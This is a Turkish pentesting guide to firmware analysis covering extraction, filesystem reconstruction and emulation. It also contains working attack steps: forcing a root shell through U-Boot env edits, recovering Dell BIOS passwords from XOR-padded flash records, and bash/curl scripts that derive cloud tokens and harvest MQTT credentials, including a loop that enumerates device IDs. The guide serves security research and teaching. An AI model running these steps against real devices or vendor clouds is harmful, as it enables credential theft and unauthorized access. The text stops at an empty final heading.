# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

Açık donanım arayüzlerinden firmware edinmek için bkz. [UART konsoluyla firmware dökümü alma](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) ve [SPI flash dökümü alma](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Konsola erişimden önce, önyükleme sırasında tekrarlanabilir UART kaydı almak için bkz. [SCPI ile kontrol edilen güç ve osiloskop kullanarak veri toplama](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleriyle kullanıcıların etkileşim kurduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların düzgün çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; böylece cihaz açıldığı andan itibaren gerekli talimatlara erişebilir ve işletim sistemi başlatılabilir. Güvenlik açıklarını belirlemede firmware'i incelemek ve olası değişiklikleri yapmak kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamanın kritik ilk adımıdır. Bu süreçte şu bilgiler toplanır:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader ayrıntıları
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuat sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları büyük önem taşır. Ayrıca mevcut açık kaynaklı yazılım bileşenlerini manuel ve otomatik inceleme süreçleriyle analiz etmek de faydalıdır. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz sunar.

## **Firmware Edinme**

Firmware edinmek için, her biri farklı karmaşıklık düzeyine sahip çeşitli yöntemler kullanılabilir:

- Doğrudan kaynaktan (geliştiricilerden, üreticilerden)
- Sağlanan talimatlarla **derleyerek**
- Resmî destek sitelerinden **indirerek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanarak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **bulut depolama alanına** doğrudan erişerek
- Aradaki adam teknikleriyle **güncellemeleri** yakalayarak
- **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkararak**
- Cihaz iletişimindeki güncelleme isteklerini **dinleyerek**
- **Sabit kodlanmış güncelleme uç noktalarını** belirleyip kullanarak
- Bootloader'dan veya ağ üzerinden **döküm alarak**
- Diğer yöntemler işe yaramazsa uygun donanım araçlarıyla depolama yongasını **çıkarıp okuyarak**

### Yalnızca UART günlükleri: Flash'teki U-Boot env üzerinden root shell'i zorlamak

UART RX yok sayılıyorsa (yalnızca günlükler alınıyorsa), **U-Boot ortam blob'unu** çevrimdışı düzenleyerek yine de bir init shell'i zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SOIC-8 klipsi ve programlayıcıyla (3.3V) SPI flash'ın dökümünü alın:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env bölümünü bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve blob için **U-Boot env CRC32 değerini yeniden hesaplayın**.
3. Yalnızca env bölümünü yeniden flashlayın ve yeniden başlatın; UART üzerinden bir shell görünmelidir.

Bu, bootloader shell'i devre dışı bırakılmış ancak env bölümüne harici flash erişimiyle yazılabilen embedded cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **firmware'e sahip olduğunuza göre**, nasıl ele almanız gerektiğini belirlemek için içindeki bilgileri çıkarmanız gerekir. Bunun için kullanabileceğiniz çeşitli araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla fazla bir şey bulamazsanız, `binwalk -E <bin>` ile imajın **entropisini** kontrol edin; entropi düşükse imajın şifrelenmiş olması pek olası değildir. Entropi yüksekse imaj muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca **firmware içine gömülü dosyaları** çıkarmak için şu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da kullanabilirsiniz.

### Harici flash bellekteki ham görüntü varlıkları

Harici bir SPI dökümü, MCU'nun çalıştırılabilir firmware'i olmak zorunda değildir. Cortex-M hedefinde, her olası kod bölgesinin başlangıcını cihazın bellek haritasıyla karşılaştırın: normal bir vektör tablosu, makul bir SRAM stack pointer ve çalıştırılabilir bellekte bulunan bir reset-handler adresiyle başlar. Offset sıfırda vektör tablosunun bulunmaması, tek başına yonganın tamamında kod olmadığını kanıtlamaz; diğer offset'leri ve boot düzenini de inceleyin. `binwalk` herhangi bir container bulamazsa ham baytları inceleyin ve bir [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) içindeki flash okuma adreslerini yeni ekranları yükleyen eylemlerle ilişkilendirin.<sup>[[14]](#references)</sup>

Bir ekran varlığı bölgesi için PNG/JPEG olduğunu varsaymak yerine olası piksel biçimlerini ve boyutları deneyin. Kaynakta belirtilen cihazda **80×160 RGB565 little-endian** kareler kullanılmıştır: piksel başına iki bayt olduğundan bir kare **25.600 bayttır** (25 KiB), 24 kilobit değil. Çözümlenen bir flash okuma adresi ekran varlığının offset'ini belirledi; araştırmacı `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` ile hazırlanmış bir görüntüyü dönüştürdü, orijinal dökümde aynı boyuttaki varlığı bununla değiştirdi, `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` ile yazdı ve yeni görüntüyü ekranda doğruladı. Bu, MCU'nun dahili firmware'inin çıkarıldığını veya yeniden flash edildiğini değil, yazılabilir *harici ekran varlıklarını* gösterir. Herhangi bir yazma işleminden önce orijinal dökümü saklayın ve boyutları, bayt sırasını, offset'i ve değiştirilen verinin uzunluğunu doğrulayın.<sup>[[14]](#references)</sup>

### Diferansiyel flash analizi ve kurtarılabilir XOR gizli veri depoları

Bir firmware ayarının belgelenmiş bir depolama biçimi yoksa, önce eşleşen birkaç flash okuması alın, **tam olarak bir** ayarı değiştirin, ardından yonganın tamamını yeniden döküp offset'leri karşılaştırın. Kontrollü değerlerle deneyi tekrarlamak, ayarı sayaçlardan ve yazma meta verilerinden ayırmaya yardımcı olur; verilerin yerinde değiştirilmek yerine yeni offset'lere yazılması, yalnızca sona eklemeli veya log-structured bir depolamaya işaret eder. Silinmiş/tombstone girdilerini saklayın; yük verileri hâlâ kurtarılabilir olabilir.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Bölgeyi bulduktan sonra, `binwalk` gibi araçlarla firmware modüllerini çıkarın ve writer/validator kodunu Ghidra'da tersine mühendislikle inceleyin. Şemayı yalnızca şifreli metin örüntülerinden çıkarsamak yerine, alan sınırlarını, padding'i, key indexing'i ve key derivation'ı kodda doğrulayın.<sup>[[12]](#references)</sup>

#### Şifrelenmiş sıfır padding'den key'leri kurtarma

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) bölümünde açıklandığı gibi, bilinen plaintext aynı offset'lerdeki keystream byte'larını açığa çıkarır. Tekrarlanan bir XOR key'indeki her index'i sıfır padding'in kapladığı durumlarda, sabit boyutlu bir alan özellikle savunmasızdır: `0x00 XOR key_byte = key_byte` olduğundan, şifrelenmiş padding bu key byte'larını doğrudan açığa çıkarır. Her key index'i kapsanıyorsa, ciphertext'in sonundan key'i yeniden oluşturun ve doldurulmuş byte'ların şifresini çözün.<sup>[[12]](#references)</sup>

Dell'in savunmasız DVAR BIOS password formatı bunun somut bir örneğidir: 32 byte'lık alanın `0` numaralı byte'ı plaintext'tir; `1..31` numaralı byte'lar ise tekrarlanan 20 byte'lık bir key kullanır.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bir parola uzunluğu `L` için, XOR işleminden önce `L..31` konumları sıfırdı. `L <= 12` olduğunda bu konumlar tüm anahtar indekslerini kapsar; böylece tam anahtar ve parola brute force yapmadan kurtarılır:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Geçmiş kayıtlardan anahtarları çıkarma

Her kaydı bağımsız olarak analiz etmeyin. DVAR anahtarı yaklaşık olarak `modified_md5(device_seed || variable_GUID || password[0])` şeklinde türetilir: device seed ve GUID sabittir; parolaya bağlı tek girdi, açık metindeki ilk bayttır. Bu, cihaz başına en fazla 256 anahtar olduğu ve aynı baytla başlayan kayıtların aynı anahtarı paylaştığı anlamına gelir. Etkin ve silinmiş kayıtları bu bayta göre gruplayın; kısa bir geçmiş kayıt, padding aracılığıyla anahtarın tamamını açığa çıkarabilir ve kendi padding'i yetersiz olan güncel, daha uzun bir kaydın şifresini çözebilir. Bu nedenle eski şifreli metinler silinmek yerine tombstone olarak işaretlendiğinde, parola rotasyonu maruziyeti artırabilir.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) aracı DVAR'ı bulur, aday kayıtları doğrular, parolaları kurtarır ve depolanan ham veriyi/anahtar baytlarını görüntüleyebilir. Aracı bir repo kopyasından derleyin ve doğrulanmış bir flash imajını şöyle tarayın:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Özel parser'lar için, kayıt yapısını, yazdırılabilir karakter kısıtlamalarını, sıfır dolgusu kontrollerini, anahtar entropisini ve anahtarın döngü yaptığı yerlerdeki tutarlılığı kullanarak yanlış pozitifleri reddedin. Tekrarlanan dump'lar her yazma işleminde seyrek bit değişimleri gösteriyorsa, gözlemlenen maskeleri listeleyin ve bu kısıtlamalara göre düzeltmeleri sıralayın; ancak sezgisel çıktıyı kesin kurtarma sonucu olarak sunmak yerine belirsiz karakterleri belirtin.<sup>[[12]](#references)</sup>

Parola doğrulayıcıları, geri döndürülebilir şifreli metin yerine salt eklenmiş, yinelemeli tek yönlü bir hash saklamalıdır; günlük yapılı depolar ise yerini alan gizli materyali güvenli bir şekilde silmelidir.<sup>[[12]](#references)</sup>

### Dosya Sistemini Alma

Önceki yorumlarda belirtilen `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini **dosya sistemi türünün adını taşıyan bir klasörün içine** çıkarır. Bu türler genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Elle Çıkarma

Bazen binwalk, dosya sisteminin magic byte'ına imzalarında **yer vermez**. Bu durumlarda, aşağıdaki adımları izleyerek dosya sisteminin offset'ini bulmak ve sıkıştırılmış dosya sistemini binary'den ayıklamak için binwalk kullanın; ardından dosya sistemini türüne göre **elle çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Aşağıdaki **dd command** komutunu kullanarak Squashfs dosya sistemini carve edin.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Bölünmüş gömülü kök dosya sistemlerini yeniden oluşturma

Ham bir eMMC/SSD dökümü geçerli bir dosya sistemi başlığı içeriyor ancak meta veri ofsetleri nominal bölümün ötesine uzanıyorsa, dosya sistemini hemen bozuk olarak sınıflandırmayın. Gömülü önyükleme kodu, Device Mapper ile birden fazla fiziksel aralıktan gerçek kök aygıtı oluşturabilir; bu nedenle tek bir GPT bölümünü ayıklamak yalnızca ilk segmenti verir.<sup>[[9]](#references)</sup>

#### Tam medya görüntüsünü triyaj edin

Öncelikle edinimin tamamlandığını, boyutun sabit kaldığını ve görüntü dosyasını hâlâ hiçbir yazıcının kullanmadığını doğrulayın. Dosya adı bir başlangıç/bitiş adresi içeriyorsa bu aralığı gerçek bayt sayısıyla karşılaştırın. GPT’yi salt okunur modda kurtarın ve yalnızca gerekli aralığı bağlayın; iş istasyonunda güvenilmeyen bir fiziksel birim üzerinde `vgchange -ay` çalıştırmayın, çünkü birim grubu çakışmaları ve istenmeyen yazmalar meydana gelebilir.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Orijinal init mantığının veya bir LVM yığınının tüm imajı görmesi gerekiyorsa, atılabilir bir VM tercih edin. Standart bir boot partition'dan alınan geçmiş boot log'ları özellikle kullanışlıdır: bootloader, tescilli kapsayıcıdaki ofsetleri, bileşen uzunluklarını, slot seçimini, hizalama kurallarını ve imza doğrulamasını log'lamış olabilir. Gömülü komut satırını/kernel/initramfs'i ayıklamak için bu değerleri kullanın; ardından her çıktıyı `file`, magic byte'lar ve `binwalk` ile bağımsız olarak doğrulayın. Kapsayıcının sonuna kadar okumak, initrd'yi, ACPI nesnesini veya imzayı yanlışlıkla kernel'e ekleyebilir.<sup>[[9]](#references)</sup>

#### Boot sırasındaki blok eşlemesini kurtarın

Kernel'in initramfs'ini çıkarın ve `/init` dosyasını ve tüm storage library'lerini reverse edin. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) bölümünde `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` ve partition yollarına yönelik string referanslarını takip edin; ardından etkin A/B slot'unu seçen ve tabloyu oluşturan kodun izini sürün. radare2 için kullanışlı başlangıç noktaları: `r2 -A init`, `afl`, `pdf @ main` ve `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Linear target, sanal bir aygıtın ardışık aralıklarını bir veya daha fazla yedek aygıt üzerindeki aralıklara eşler. Kurtarılan iki segmentli bir tablo genellikle şu biçimdedir (tüm konumlar ve uzunluklar 512-byte sector cinsindendir):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Makine kodundaki aritmetiği; tamsayı genişliği, kaydırmalar ve birim dönüşümleri dâhil olmak üzere aynen yeniden üretin. Örneğin, aşağıdaki ifade bir bayt boyutunu önce 4-KiB sınırına aşağı yuvarlar, ancak bundan sonra 512 baytlık sektörlere dönüştürür; bunu `p4_bytes // 512` ile değiştirmek, bölüm sayfa hizalı olmadığında seçilen son kısmı `p4_bytes % 4096` kadar kaydırır.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

GPT'den türetilen offset'leri, ters çevrilmiş sektör sayılarını ve ortaya çıkan çıktı uzunluğunu ayrı ayrı doğrulayın.<sup>[[9]](#references)</sup>

#### Bozulmayı sabit bir yeniden oluşturma hatasından ayırt etme

SquashFS için `unsquashfs`'i çalıştırmadan önce `hsqs` magic değerini kontrol edin ve superblock'taki 40. offset'te bulunan little-endian 64-bit `bytes_used` alanını çözümleyin. Birbirinden bağımsız birkaç yapıda çıkarma işlemi başarısız olursa, beklenen konumların çevresindeki geniş bir aralıkta arama yapın ve güçlü yapısal adaylar arayın: sıkıştırması açılabilen bir metadata bloğu, art arda gelen birkaç geçerli dizin girdisi, makul inode alanları, inode sayısıyla tutarlı bir root inode veya geçerli bir integrity-metadata yapısı. Tek bir magic eşleşmesi yeterli değildir.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Aynı imzalı delta, birbirinden bağımsız yapıları — örneğin dizin meta verilerini ve bir verity kaydını — geçerli hâle getiriyorsa, olası neden eksik baytlar değil, sistematik bir segment başlangıcı hatasıdır. Sahipsiz dosyaları kurtarmayı veya dosya sistemi meta verilerini yamamayı denemeden önce, tersine çevrilmiş aritmetiği yeniden inceleyin ve atılmış kalan değerleri, işaretliliği, taşmayı veya sektör/sayfa yuvarlamasını araştırın.<sup>[[9]](#references)</sup>

Son olarak, koruma sınırlarını birbirinden ayrı tutun: TPM ile mühürlenmiş LUKS birimleri veri gizliliğini korurken, imzalı bir dm-verity eşlemesi kök dosya sistemi bütünlüğünü korur. Yazılım TPM’si, orijinal fiziksel TPM’ye mühürlenmiş bir anahtarı kurtaramaz; verity doğrulamasını atlayan, yalnızca araştırma amaçlı bir init üzerinden değiştirilmiş bir SquashFS’i başlatmak da imzasını taklit etmez veya dm-verity’yi bozmaz.<sup>[[9]](#references)</sup>

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve olası güvenlik açıklarını anlamak için onu incelemek önemlidir. Bu süreç, firmware imajını analiz etmek ve içinden değerli verileri çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyanın ( `<bin>` olarak anılır) ilk incelemesi için bir dizi komut sunulmuştur. Bu komutlar dosya türlerini belirlemeye, dizeleri çıkarmaya, ikili verileri analiz etmeye ve bölüm ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Image'ın şifreleme durumunu değerlendirmek için `binwalk -E <bin>` komutuyla **entropy** kontrol edilir. Düşük entropy şifreleme olmadığını, yüksek entropy ise olası şifreleme veya sıkıştırmayı gösterir.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosya incelemede kullanılan **binvis.io** gibi araç ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` komutuyla genellikle dosya sistemi çıkarılabilir; çoğunlukla dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk**, magic bytes eksik olduğundan dosya sistemi türünü tanıyamazsa manuel çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin offset'i bulunur, ardından dosya sistemini ayıklamak için `dd` komutu kullanılır:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel şekilde çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan ağ daemon'ları, hardcoded kimlik bilgileri, API endpoint'leri, güncelleme sunucusu işlevleri, derlenmemiş kodlar, başlangıç script'leri ve çevrimdışı analiz için derlenmiş ikili dosyalar incelenir.

İncelenmesi gereken **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Potansiyel güvenlik açıkları için yapılandırma ve script dosyaları
- Daha ayrıntılı analiz için gömülü ikili dosyalar
- Yaygın IoT cihazı web sunucuları ve ikili dosyaları

Dosya sistemindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya çeşitli araçlar yardımcı olur:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş İkili Dosyalarda Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kodlar hem de derlenmiş ikili dosyalar, güvenlik açıkları açısından incelenmelidir. Unix ikili dosyaları için **checksec.sh**, Windows ikili dosyaları içinse **PESecurity** gibi araçlar, istismar edilebilecek korumasız ikili dosyaları belirlemeye yardımcı olur.

## Türetilmiş URL token'ları aracılığıyla cloud yapılandırmasını ve MQTT kimlik bilgilerini elde etme

Birçok IoT hub'ı, cihaza özel yapılandırmasını şu biçimdeki bir cloud endpoint'inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında, `<token>` değerinin cihaz kimliğinden hardcoded bir secret kullanılarak yerel olarak türetildiğini görebilirsiniz. Örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve büyük harfli hex olarak gösterilir

Bu tasarım, deviceId ve STATIC_KEY değerlerini öğrenen herkesin URL'yi yeniden oluşturup cloud yapılandırmasını almasına olanak tanır. Bu yapılandırma çoğu zaman plaintext MQTT kimlik bilgilerini ve topic öneklerini açığa çıkarır.

Uygulamalı iş akışı:

1) UART boot log'larından deviceId değerini çıkarın

- 3.3V UART adaptörünü (TX/RX/GND) bağlayıp log'ları alın:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Örneğin, bulut yapılandırması URL kalıbını ve broker adresini yazdıran satırları arayın:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware'den STATIC_KEY'i ve token algoritmasını kurtarın

- Binary dosyalarını Ghidra/radare2'ye yükleyin ve config path'i ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (örn. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud yapılandırmasını ve MQTT kimlik bilgilerini topla

- URL'yi oluşturup curl ile JSON'u çek; sırları çıkarmak için jq ile ayrıştır:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Plaintext MQTT'yi ve zayıf topic ACL'lerini kötüye kullan (varsa)

- Bakım topic'lerine abone olmak ve hassas olayları aramak için kurtarılan kimlik bilgilerini kullan:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Tahmin edilebilir cihaz kimliklerini listeleyin (ölçekli olarak, yetkilendirmeyle)

- Birçok ekosistem, satıcı OUI/ürün/tür baytlarının ardından sıralı bir sonek kullanır.
- Aday kimlikleri yineleyebilir, token’lar türetebilir ve yapılandırmaları programatik olarak alabilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu enumeration denemeden önce her zaman açık yetki alın.
- Mümkün olduğunda hedef donanımı değiştirmeden sırları elde etmek için emülasyonu veya statik analizi tercih edin.


Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dinamik analizini** mümkün kılar. Bu yaklaşım donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak kök dosya sistemini veya belirli binary dosyalarını Raspberry Pi gibi mimarisi ve endianness'i eşleşen bir cihaza ya da önceden oluşturulmuş bir sanal makineye aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil Binary Dosyalarını Emüle Etme

Tek programları incelerken programın endianness'ini ve CPU mimarisini belirlemek çok önemlidir.

#### MIPS Mimarisi Örneği

MIPS mimarisi için bir binary dosyasını emüle etmek üzere şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Ve gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

For MIPS (big-endian), `qemu-mips` kullanılır; little-endian binary'ler içinse `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'lerinde süreç benzerdir; emülasyon için `qemu-arm` emulator'ü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzeri araçlar, tüm firmware'in emülasyonunu kolaylaştırır, süreci otomatikleştirir ve dynamic analysis'a yardımcı olur.

### Emülasyon için bölünmüş ve doğrulanan root filesystem'leri yeniden oluşturma

Bir SquashFS superblock'ı okunabiliyor ancak inode, directory veya fragment-table offset'leri olanaksız görünüyorsa, `unsquashfs`'i hemen yamamayın. Erken açılış binary'sini tersine mühendislikle inceleyin ve oluşturduğu block-device graph'ını yeniden üretin: gömülü sistemler, görünürde bir root partition sunarken başka bir partition'dan alınan sektörleri ekleyen bir `dm-linear` mapping ile gerçek filesystem'i oluşturabilir. Yalnızca superblock'ı kontrol eden testler başarılı olabilir; ancak sonraki tüm metadata block'ları kaymış olabilir.<sup>[[11]](#references)</sup>

Firmware'in aritmetiğini aynen koruyun. Özellikle uzunlukların byte, 512-byte sektör veya 4 KiB sayfa cinsinden olup olmadığını belirleyin; shift ve truncation işlemlerini özgün sıralarıyla yeniden üretin ve A/B düzenlerindeki bankaya bağlı kuyruk bölgelerini hesaba katın. Örneğin, `(partition_bytes >> 12) << 3` önce 4 KiB sınırına göre truncation yapar, ardından sonucu 512-byte sektör cinsinden ifade eder; bunu `partition_bytes // 512` ile değiştirmek, eklenen extent'i birkaç kilobyte kaydırabilir ve sonraki tüm SquashFS tablolarını bozabilir.<sup>[[11]](#references)</sup>

Yararlı bir doğrulama iş akışı:<sup>[[11]](#references)</sup>

1. Verifier/init binary'sinden her `dm-linear` segment'inin kaynak device'ını, başlangıç sektörünü ve uzunluğunu çıkarın.
2. Hizalama semantiğini değiştirmeden extent'leri birleştirin veya map edin.
3. Extraction hâlâ başarısız olursa, öngörülen sınırın çevresindeki küçük bir aralıkta arama yapın ve yalnızca makul görünen bir superblock'ı kabul etmek yerine art arda gelen birkaç geçerli metadata yapısının bulunmasını şart koşun.
4. Yeniden oluşturulan image üzerinde değiştirilmemiş bir `unsquashfs` çalıştırın; tüm directory'lerin ve fragment'lerin başarıyla taranması, `unsquashfs -stat` çıktısından daha güçlü bir kanıttır.

#### Analyst-controlled dm-verity replacement

